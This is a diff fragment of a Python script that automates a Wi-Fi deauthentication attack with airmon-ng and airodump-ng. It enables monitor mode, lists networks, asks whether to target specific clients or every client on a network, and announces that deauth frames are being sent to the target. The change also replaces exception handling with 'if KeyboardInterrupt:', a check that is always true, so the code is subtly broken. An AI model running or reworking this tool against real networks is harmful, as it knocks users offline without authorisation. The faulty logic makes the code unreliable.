@@ -28,19 +28,16 @@ subprocess.run(["sudo" , "airmon-ng" , "start" , "wlan0"])
 time.sleep(1)
 print("Discoverging networks:")
 time.sleep(2)
-try:
-    subprocess.run(["sudo" , "airodump-ng" , "wlan0"])
-except KeyboardInterrupt:
-    client_or_not = input("Enter 'y' if you want to attack just specific client(s) , type 'n' if you want to attack all the clients in a netwrok: ")
+subprocess.run(["sudo" , "airodump-ng" , "wlan0"])
+client_or_not = input("Enter 'y' if you want to attack just specific client(s) , type 'n' if you want to attack all the clients in a netwrok: ")
 if client_or_not == "y":
     bssid = input("Enter the netwrok's bssid to attack: ")
     time.sleep(1.5)
     print("Running airodump-ng")
     print("Press Ctrl+C to stop discovering netwroks!")
     time.sleep(1)
-    try:
-        subprocess.run(["sudo" , "airodump-ng" , "-d" , bssid , "wlan0" ])
-    except KeyboardInterrupt:
+    subprocess.run(["sudo" , "airodump-ng" , "-d" , bssid , "wlan0" ])
+    if KeyboardInterrupt:
         mac_address = input("Enter the client(s) mac address to continue: ")
         time.sleep(0.5)
         print("Sending Deauth frames to the target!")
